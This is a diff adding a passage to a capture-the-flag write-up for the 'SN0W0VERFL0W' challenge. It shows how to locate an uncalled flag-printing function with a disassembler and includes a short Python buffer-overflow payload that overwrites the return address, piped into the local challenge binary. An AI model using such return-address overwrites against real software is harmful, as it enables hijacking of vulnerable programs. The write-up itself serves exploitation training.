@@ -80,6 +80,22 @@
   * Let's just throw it into a disassembler! I'll use Hopper for this, but you can use any similar application.
   * After looking around at the different procedures in this binary in Hopper, there is one that stood out!
   
+  ![Alt text](https://github.com/cdong1012/X-MAS-CTF/blob/master/SN0W0VERFL0W/images/6.png)
   
+  * It seems like this procedure/method moves the flag into the parameter of the puts function(which is basically a print function) and call puts! However, this method is not called in the executable, so we never see it getting executed and print out the flag. 
+  * Since we can redirect code anywhere, we can just redirect our code flow to this particular method! According to Hopper, the start of this method is at 0x0000401156.
+  * We can change our script to 
+  ```python
+  import struct
+  padding = "AAAABBBBCC"
+  rbp = "CCDDDDEE"
+  ret_addr = struct.pack('I', 0x401156)
+  ret_addr1 = struct.pack('I', 0x0000) # padd the address up to 8 bytes to fully overwrite the RSP
+  
+  print(padding + rbp + ret_addr + ret_addr1)
+  ```
+  * And this should redirect our code to the method to print the flag!!!
+  * Try running ``` python your_script_name.py | ./chall ``` to pipe it into the executable!
+  * You should see 
   
   
